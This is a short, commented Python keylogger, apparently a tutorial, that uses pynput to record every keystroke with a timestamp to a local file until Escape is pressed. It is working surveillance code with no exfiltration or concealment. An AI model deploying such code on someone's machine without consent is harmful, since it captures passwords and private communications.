# pynput.keyboard is used to control and monitor the keyboar
# Key provides predefined constants for special keys
# Listener listens for keyboard events
from pynput.keyboard import Key, Listener
# Library that will log the key strokes into a file
import logging

# Configures the logging settings.
# The log messages will be saved in a file named keylog.txt
# All messages of level DEBUG and above will be recorded
# The format of the log messages will include the timestamp and the log message itself
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

# function trigged every time a key is pressed
def on_press(key):
    # Converts the key object into a string and logs it o the file using the INFO level
    logging.info(str(key))

    # Stop the listener if the escape key is pressed
    if key == Key.esc:
        return False # Returning False stops the listener

# Starts a listener instance to monitor key presses
# Specifies the callback function to call whenever a key is pressed
with Listener(on_press=on_press) as listener :
    # Keeps the program running and the listener active
    listener.join()
